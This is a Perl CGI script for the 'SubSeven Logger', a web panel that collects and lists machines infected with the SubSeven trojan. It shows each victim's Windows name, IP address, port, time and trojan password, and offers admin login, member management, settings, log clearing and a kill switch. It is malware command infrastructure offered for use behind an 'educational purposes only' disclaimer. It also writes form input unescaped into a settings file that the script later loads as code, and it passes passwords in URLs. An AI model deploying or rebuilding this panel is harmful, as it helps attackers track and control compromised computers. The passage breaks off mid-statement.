#! /usr/bin/perl

### ^ path to perl on your server (should be correct)
###   If your wrong, you will get a 500 error.

###################################################################
#                     +SUBSEVEN LOGGER+                           #
###################################################################
#                                                                 #
# SubSeven is provided 'as-is', without any express or implied    #
# warranty. in no event will the author be held liable for any    #
# damages arising from the use of it.                             #
#                                                                 #
# The author can't be held responsible for any illegal action(s)  #
# arising from the use of this software. Sub7 is provided for     #
# educational purposes only!                                      #
#                                                                 #
#                 SUBSEVEN CAN BE FOUND AT                        #
#                    www.sub7page.com                             #
#                                                                 #
###################################################################
# There is nothing in this file you need to edit, in fact you     #
# may cause harm just by changing a few letters.  If however      #
# the first line of this program is not the path to perl on       #
# your server, you need to change that.  But that is all, no      #
# more.  Please Read the README.txt that you receved with this    #
# file.  all questions will be reviewed there.                    #
#                                                                 #
# There is no way to modify this script so that it will retreave  #
# information that it already does not.                           #
###################################################################
#                                                                 #
#               - ABOUT CGI SUBSEVEN LOGGER -                     #
#                                                                 #
#   Programmer:   Black-Fire                                      #
#   Website:      http://www.black-fire.net                       #
#   ICQ:          64782400                                        #
#   E-mail        sublogger@black-fire.net                        #
#   IRC:          irc.chatech.net  #bfn                           #     
#                                                                 #
###################################################################
#                                                                 #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  M""""""'YMMMMMP"""""YMMMMMMM"""""""`YMMMMP"""""YMMMM""""""""M  #
#  M  mmmm. `MMM' .mmm. `MMMMMM  mmmm.  MMM' .mmm. `MMMmmm  mmmM  #
#  M  MMMMM  MMM  MMMMM  MMMMMM  MMMMM  MMM  MMMMM  MMMMMM  MMMM  #
#  M  MMMMM  MMM  MMMMM  MMMMMM  MMMMM  MMM  MMMMM  MMMMMM  MMMM  #
#  M  MMMM' .MMM. `MMM' .MMMMMM  MMMMM  MMM. `MMM' .MMMMMM  MMMM  #
#  M_______.MMMMMb_____dMMMMMMM__MMMMM__MMMMb_____dMMMMMMM__MMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM""""""""`MMM""""""'YMMMM""MMM""""""""MMMMMMMMMMMMMM  #
#  MMMMMMMMMM  mmmmmmmMMM  mmmm. `MMM  MMMmmm  mmmMMMMMMMMMMMMMM  #
#  MMMMMMMMMM       MMMMM  MMMMM  MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM  MMMMMMMMMM  MMMMM  MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM  MMMMMMMMMM  MMMM' .MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM________.MMM_______.MMMM__MMMMMM__MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #                                     
#                                                                 #
###################################################################

require "subseven.set";

print "Content-type: text/html\n\n";
########## Get enviroment vars #############>


$setabout = "false";
$script = $ENV{'SCRIPT_NAME'};

########## Set program vars ############
$kswitch = "true";  #### true if you want kill switch active, false if you want it disabled.
$error = "false";
$errortext = "";

########### View Settings #################
print "<html><title>$Xtitle</title>\n<body bgcolor = \"$Xbgcolor\" text = \"$Xtext\" link = \"$Xlinks\" alink = \"$Xlinks\" vlink = \"$Xlinks\">\n";
print "<font face = \"$Xfont\">\n";


################# REMOVE AD BANNERS #######################
if ($Xads eq "true") {
}
else {
print "<script language = \"javascript\">\n/*\n<!--#echo banner=\"\"-->\n*/\n</script>\n";
}

########### Read Inputs and get Time ###############
read(STDIN, $bufferb, $ENV{'CONTENT_LENGTH'});
@pairsb = split(/&/, $bufferb);
foreach $pairb (@pairsb) {  ($nameb, $valueb) = split(/=/, $pairb);
  $valueb =~ tr/+/ /;
  $valueb =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $valueb =~ s/~!/ ~!/g;  $SUBIN{$nameb} = $valueb;}

@pairs = split(/&/, $ENV{'QUERY_STRING'});
foreach $pair (@pairs) {  ($name, $value) = split(/=/, $pair);
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ s/~!/ ~!/g;  $SUBOUT{$name} = $value;}
	
	@days   = ('Sunday','Monday','Tuesday','Wednesday',
               'Thursday','Friday','Saturday');
($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];

$time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
$date = "$days[$wday] $mday, $time";
print "<div align = \"right\">Servers Time: $date</div><br>\n";

if ($Xsetup eq "not installed") {
print "<html><body bgcolor = \"black\" text = \"white\"><b>\n";
print "This program is not active until after you run setup.cgi , please do so now.\n";
print "</body></html>\n";
}
else {

$ra = $ENV{'REMOTE_ADDR'};
open(FILE, "subseven.ban");
@thisf = <FILE>;
close(FILE);
open(FILE, ">subseven.ban");
foreach $bannuser (@thisf) {
($Bip, $Bday, $Bcnt) = split(/\|/, $bannuser);
$bdaya = $Bday + 1;
if ($mday eq $Bday or $mday eq $bdaya) {
print FILE "$Bip|$Bday|$Bcnt|\n";
}
else {
if ($ra eq $Bip) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">BANN NOTICE</font></center></b></td><tr><td>\n";
print "<b><br><font face = \"$Xfont\">You where removed from the bann list.  You will still be subject to access violation banns.</td></table>\n";
}
}
}
close(FILE);
open(FILE, "subseven.ban");
@thisf = <FILE>;
close(FILE);
$killaps = "no";
foreach $bannuser (@thisf) {
($Bip, $Bday, $Bcnt) = split(/\|/, $bannuser);
if ($ra eq $Bip and $Bcnt eq 10) {

$killaps = "yes";

}
}

if ($killswitch eq "ACTIVE" or $killaps eq "yes") {
if ($killswitch eq "ACTIVE") {
$errortext = "Script not functional.";
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">SERVER ERROR</font></center></b></td><tr><td>\n";
print "<b><br><font face = \"$Xfont\">$errortext</td></table>\n";
}
else {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">BANN NOTICE</font></center></b></td><tr><td>\n";
print "<b><br><font face = \"$Xfont\">Due to repeate access violations, your ip has been banned from this program.  you will be removed from the bann list after 24 hours.</td></table>\n";
}
}
else {
######### Locate and read operation code ############ 
$opper = $SUBOUT{'action'};
if ($opper eq "") {
$opper = $SUBIN{'action'};
}


######### Read settings ###########
if ($opper eq "") {
if ($Xauth eq "true") {

######### PRINT LOGIN HTML ############
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"auth2\">\n";
print "<center><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><center><b><font face = \"$Xfont\">Login Required</b></center></td><tr><td>\n";
print "<table border = 0 callpadding = 0 cellspacing = 0><td>\n";
print "<b><font face = \"$Xfont\">UserName:</b></td><td><input type = \"text\" name = \"user\" size = 23></td><tr><td>\n";
print "<b><font face = \"$Xfont\">PassWord:</b></td><td><input type = \"password\" name = \"pass\" size = 23></td><tr><td>\n";
print "</td><td><input type = \"submit\" value = \"Login\"></td></table>\n";
print "</form>\n";
}
else {
$opper = "view";
$Uauth = "true";
}
}

########## Validate User #############
if ($opper eq "auth2") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq "") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
}
open(FILE, "subseven.mem");
@members = <FILE>;
close(FILE);
$found = "false";
foreach $memberx (@members) {
($member, $passwd) = split(/\|/, $memberx);
if ($member eq $username and $passwd eq $password and $Xmulti eq "true") {
if ($member eq "" or $member eq " ") {
}
else {
$found = "yes";

}
}
}
if ($found eq "yes") {
$opper = "view";
$Uauth = "true";
}
else {
if ($username eq $Xrequser and $password eq $Xreqpass) {
$opper = "view";
$Uauth = "true";
$admin = "true";
}
else {
$errortext = "You are not autherized to view the contents of this file!  Please contact the system administrator to request access.";
&derror;
&bforce;
}
}
}

########## Display List ##############
if ($opper eq "view") {
if ($Uauth eq "true" or $Xauth eq "false") {
open(FILE, "subseven.log");
@file = <FILE>;
close(FILE);
@file = reverse(@file);
if ($admin eq "true") {
print "<center><table border = 0 cellpadding = 0 cellspacing = 5><td><div align = \"RIGHT\"><font face = \"$Xfont\"><a href = \"$script?action=about&user=$username&pass=$password\">[About]</a> <a href = \"$script?action=adminauth&user=$username&pass=$password\">[Admin Menu]</a></div></td><tr><td><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
}
else {
print "<center><table border = 0 cellpadding = 0 cellspacing = 5><td><div align = \"RIGHT\"><font face = \"$Xfont\"><a href = \"$script?action=about\">[About]</a> <a href = \"$script?action=admin\">[Admin Menu]</a></div></td><tr><td><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
}
print "<td><b><center><font face = \"areal\">VIEW LOG</font></center></b></td><tr><td>\n";
print "<table border = 1 cellpadding = 3 cellspacing = 3 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\"><td>\n";
print "<center><font face = \"$Xfont\"><b>Windows Name</td><td><center><b><font face = \"$Xfont\">ID</td><td><center><b><font face = \"$Xfont\">IP</td><td><center><b><font face = \"$Xfont\">PORT</td><td><center><b><font face = \"$Xfont\">TIME</td><td><center><b><font face = \"$Xfont\">PASS</td>\n";
print "<tr><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td>\n";
foreach $line (@file) {
($ip, $port, $date, $user, $dayz, $monz, $win, $tpass) = split(/\|/, $line);
print "<tr><td><font face = \"$Xfont\">$win</td><td><font face = \"$Xfont\">$user</td><td><font face = \"$Xfont\">$ip</td><td><font face = \"$Xfont\">$port</td><td><font face = \"$Xfont\">$date</td><td><font face = \"$Xfont\">$tpass</td>\n";
}
print "</table></td></table></td></table>\n";
}
else {
$errortext = "The system administrator has set this program to require user authentication.  Please go back to the login page and enter a valid username and password.";
&derror;
&bforce;
}
}

############ Admin login ##############
if ($opper eq "admin") {
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"adminauth\">\n";
print "<center><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><center><b><font face = \"$Xfont\">Admin Login</b></center></td><tr><td>\n";
print "<table border = 0 callpadding = 0 cellspacing = 0><td>\n";
print "<b><font face = \"$Xfont\">UserName:</b></td><td><input type = \"text\" name = \"user\" size = 23></td><tr><td>\n";
print "<b><font face = \"$Xfont\">PassWord:</b></td><td><input type = \"password\" name = \"pass\" size = 23></td><tr><td>\n";
print "</td><td><input type = \"submit\" value = \"Login\"></td></table>\n";
print "</form>\n";
}

############ admin verify ###############
if ($opper eq "adminauth") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq "" and $password eq "") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
}
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ADMIN MENU</font></center></b></td><tr><td>\n";
print "<b><font face = \"$Xfont\"><a href = \"$script?action=auth2&user=$username&pass=$password\">[ View List ]</a><p>\n";
print "<b><font face = \"$Xfont\"><a href = \"$script?action=about&user=$username&pass=$password\">[ About/help ]</a><br>\n";
print "<b><font face = \"$Xfont\"><a href = \"$script?action=s&user=$username&pass=$password\">[ Change Settings ]</a><br>\n";
print "<b><font face = \"$Xfont\"><a href = \"$script?action=cp&user=$username&pass=$password\">[ Change Password ]</a><br>\n";
if ($Xmulti eq "true") {
print "<b><font face = \"$Xfont\"><a href = \"$script?action=am&user=$username&pass=$password\">[ Add Member ]</a><br>\n";
print "<b><font face = \"$Xfont\"><a href = \"$script?action=dm&user=$username&pass=$password\">[ Delete Member ]</a><br>\n";
}
print "<b><font face = \"$Xfont\"><a href = \"$script?action=cl&user=$username&pass=$password\">[ Clear List ]</a><p>\n";
print "<b><font face = \"$Xfont\"><a href = \"$script?action=ks&user=$username&pass=$password\">[ Kill Switch ]</a><br></td></table>\n";
}
else {
$errortext = "You may not access this menu, without the valid admin username and password.";
&derror;
&bforce;
}
}

############## Kill Switch ###################
if ($opper eq "ks") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">KILL SWITCH</font></center></b></td><tr><td>\n";
print "<center><font face = \"$Xfont\">The kill switch will disable this script.  You will not be able to use it again, untill you run the setup program after re-installing the script.  This option is offered only as a last resort, DO NOT USE IT UNLESS YOU MUST. once the script is disabled, it will no longer record new IP's, and will delete all existing ones.  <p>\n";
print "Are you sure you want to Kill this program?<br>\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0><td><font face = \"$Xfont\"><a href = \"$script?action=kill&user=$username&pass=$password\">[ YES ]</a></td><td width = 30></td><td><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ NO ]</a></td></table></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "kill") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">SCRIPT DISABLED</font></center></b></td><tr><td>\n";
if ($kswitch eq "true") {
print "<font face = \"$Xfont\">The kill switch has been activated.  The administration and member services will no longer function.  You must now re-install the program to use it again.\n";
open(FILE, ">>subseven.set");
print FILE "\n\$killswitch = \"ACTIVE\";\n";
close(FILE);
open(FILE, ">subseven.log");
close(FILE);
}
else {
print "The kill switch was not activated.  You must activate it in the setup program. DISABLED ON BETA VERSIONS.";
}
print "<center></b><p><a href = \"$script?action=adminauth&user=$username&pass=$password\"><font face = \"$Xfont\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


############### CHANGE USERNAME AND PASSWORD ##################3
if ($opper eq "cp") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE PASSWORD</font></center></b></td><tr><td>\n";
print "<form action = \"$script\" method = \"post\"><input type = \"hidden\" name = \"action\" value = \"chinfo\"><input type = \"hidden\" name = \"user\" value = \"$username\"><input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\">UserName: </td><td><input type = \"text\" name = \"nwuser\" value = \"$Xrequser\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">PassWord: </td><td><input type = \"text\" name = \"nwpass\" value = \"$Xreqpass\" size = 23></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Change Username/Passowrd\"></td></table></form></td></table>\n";

}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "chinfo") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
$usern = $SUBIN{'nwuser'};
$passn = $SUBIN{'nwpass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE PASSWORD</font></center></b></td><tr><td>\n";
print "<font face = \"$Xfont\">Your information has been changed.<br>\n";
open(FILE, "subseven.set");
@file = <FILE>;
close(FILE);
open(FILE, ">subseven.set");
foreach $line (@file) {
$spla = "reqpass";
$splb = "requser";
$a = 0;
$b = 0;
@a = split(/$spla/, $line);
@b = split(/$splb/, $line);
foreach $kkm (@a) {
$a++;
}
foreach $kkl (@b) {
$b++;
}
if ($a eq 2) {
print FILE "\$Xreqpass = \"$passn\";\n";
print "the Password has successfully been changed.<br>\n";
}
else {
if ($b eq 2) {
print FILE "\$Xrequser = \"$usern\";\n";
print "The username has successfully been changed.<br>\n";
}
else {
print FILE "$line";
}
}

}
print "<center></b><p><font face = \"$Xfont\"><a href = \"$script?action=adminauth&user=$usern&pass=$passn\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


########### CLEAR LIST ##############

if ($opper eq "cl") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE PASSWORD</font></center></b></td><tr><td>\n";
print "<center><font face = \"$Xfont\">This option will clear all IP's from the list.  You should do this often to reduce the size of the log file.<p>Are you sure you want to do this?<br>";
print "<table border = 0 cellpadding = 0 cellspacing = 0><td><font face = \"$Xfont\"><a href = \"$script?action=cl2&user=$username&pass=$password\">[ YES ]</a></td><td width = 30></td><td><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ NO ]</a></td></table></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


if ($opper eq "cl2") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE PASSWORD</font></center></b></td><tr><td>\n";
open(FILE, ">subseven.log");
close(FILE);
print "<font face = \"$Xfont\">The IP log has been cleared.";
print "<center></b><p><font face = \"$Xfont\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

########## CHANGE SETTINGS ############3
if ($opper eq "s") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE SETTINGS</font></center></b></td><tr><td>\n";
print "<center><font face = \"$Xfont\">please fill out the following information</center>\n";
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"user\" value = \"$username\">\n";
print "<input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"snew\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\">Require Password:</td><td><font face = \"$Xfont\"><select name = \"rpass\"><option value = \"$Xauth\">$Xauth<option value = \"true\">true<option value = \"false\">false</select></td><tr>\n";
print "<td><font face = \"$Xfont\">Support multi users:</td><td><font face = \"$Xfont\"><select name = \"smul\"><option value = \"$Xmulti\">$Xmulti<option value = \"true\">true<option value = \"false\">false</select></td><tr>\n";
print "<td><font face = \"$Xfont\">Delete IP's after:</td><td><font face = \"$Xfont\"><select name = \"dent\"><option value = \"$Xdent\">$Xdent<option value = \"2\">2<option value = \"3\">3<option value = \"4\">4<option value = \"5\">5<option value = \"6\">6<option value = \"7\">7</select> days</td><tr>\n";
print "<td><font face = \"$Xfont\">background color:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"bgcolor\" value = \"$Xbgcolor\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">text color:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"txcolor\" value = \"$Xtext\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">text font:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"txfont\" value = \"$Xfont\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">link color:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"lncolor\" value = \"$Xlinks\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">display ads:</td><td><font face = \"$Xfont\"><select name = \"dispad\"><option value = \"$Xads\">$Xads<option value = \"true\">true<option value = \"false\">false</select></td><tr>\n";
print "<td><font face = \"$Xfont\">table border color:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"tbcolor\" value = \"$Xborders\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">table backgroud color:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"tabelbg\" value = \"$Xtables\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">Reqire SubSeven Pass:</td><td><font face = \"$Xfont\"><select name = \"rs7pass\"><option value = \"$Xsubpass\">$Xsubpass<option value = \"true\">true<option value = \"false\">false</select></td><tr>\n";
print "<td><font face = \"$Xfont\">subseven pass:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"fkey\" value = \"$Xkey\" size = 6 maxlength = 5>5 numbers</td><tr>\n";
print "<td><font face = \"$Xfont\">admin username:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"nuser\" value = \"$Xrequser\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">admin password:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"npass\" value = \"$Xreqpass\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">use IMG tags:</td><td><font face = \"$Xfont\"><select name = \"imgt\"><option value = \"$Ximages\">$Ximages</select> Currently not supported.</td><tr>\n";
print "<td><font face = \"$Xfont\">document title:</td><td><font face = \"$Xfont\"><input type = \"text\" name = \"dtitle\" value = \"$Xtitle\" size = 23></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Change Settings\"></td></table></form></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "snew") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
$rpass = $SUBIN{'rpass'}; 
$smul = $SUBIN{'smul'}; 
$bgcolor = $SUBIN{'bgcolor'}; 
$txcolor = $SUBIN{'txcolor'}; 
$txfont = $SUBIN{'txfont'}; 
$lncolor = $SUBIN{'lncolor'}; 
$dispad = $SUBIN{'dispad'}; 
$tbcolor = $SUBIN{'tbcolor'}; 
$tabelbg = $SUBIN{'tabelbg'}; 
$rs7pass = $SUBIN{'rs7pass'}; 
$fkey = $SUBIN{'fkey'}; 
$nuser = $SUBIN{'nuser'}; 
$npass = $SUBIN{'npass'}; 
$imgt = $SUBIN{'imgt'}; 
$dtitle = $SUBIN{'dtitle'}; 
$dent = $SUBIN{'dent'}; 

if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">CHANGE SETTINGS</font></center></b></td><tr><td><font face = \"$Xfont\">\n";
if ($rpass eq "" or $smul eq "" or $bgcolor eq "" or $txcolor eq "" or $txfont eq "" or $lncolor eq "" or $dispad eq "" or $tbcolor eq "" or $tabelbg eq "" or $rs7pass eq "" or $fkey eq "" or $nuser eq "" or $npass eq "" or $imgt eq "" or $dtitle eq "") {
$errortext = "Required information was not filled out.  please go back and fill out all inputs.";
&derror;
}
else {
open(FILE, ">subseven.set");
print FILE "\$Xauth = \"$rpass\";\n";
print "01) authentication required: $rpass<br>\n";
print FILE "\$Xmulti = \"$smul\";\n";
print "02) support multi users: $smul<br>\n";
print FILE "\$Xbgcolor = \"$bgcolor\";\n";
print "03) background color: $bgcolor<br>\n";
print FILE "\$Xtext = \"$txcolor\";\n";
print "04) text color: $txcolor<br>\n";
print FILE "\$Xfont = \"$txfont\";\n";
print "05) text font: $txfont<br>\n";
print FILE "\$Xlinks = \"$lncolor\";\n";
print "06) link colors: $lncolor<br>\n";
print FILE "\$Xads = \"$dispad\";\n";
print "07) display ads: $dispad<br>\n";
print FILE "\$Xborders = \"$tbcolor\";\n";
print "08) table border color: $tbcolor<br>\n";
print FILE "\$Xtables = \"$tabelbg\";\n";
print "09) table bgcolor: $tabelbg<br>\n";
print FILE "\$Xsubpass = \"$rs7pass\";\n";
print "10) require subseven pass: $rs7pass<br>\n";
print FILE "\$Xkey = \"$fkey\";\n";
print "11) file key, used as sub7 pass: $fkey<br>\n";
print FILE "\$Xrequser = \"$nuser\";\n";
print "12) admin username: $nuser<br>\n";
print FILE "\$Xreqpass = \"$npass\";\n";
print "13) admin password: $npass<br>\n";
print FILE "\$Ximages = \"$imgt\";\n";
print "14) display images: $imgt<br>\n";
print FILE "\$Xtitle = \"$dtitle\";\n";
print "15) document title: $dtitle<br>\n";
print FILE "\$Xdent = \"$dent\";\n";
print "16) auto delete: $dent days old<br>\n";
close(FILE);
print "DONE!</td></table>";
print "<center></b><p><font face = \"$Xfont\"><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ MENU ]</a>\n";
}
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}


############# Add new member #############

if ($opper eq "am") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ADD MEMBER</font></center></b></td><tr><td>\n";
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"user\" value = \"$username\">\n";
print "<input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"newm\">\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\">Member name: </td><td><input type = \"text\" name = \"mname\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\">Member pass: </td><td><input type = \"password\" name = \"mpass\" size = 23></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Add Member\"></td></table></form></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "newm") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {

$muser = $SUBIN{'mname'};
$mpass = $SUBIN{'mpass'};
if ($muser eq "" or $mpass eq "") {
$errortext = "You must fill in a username and password.";
&der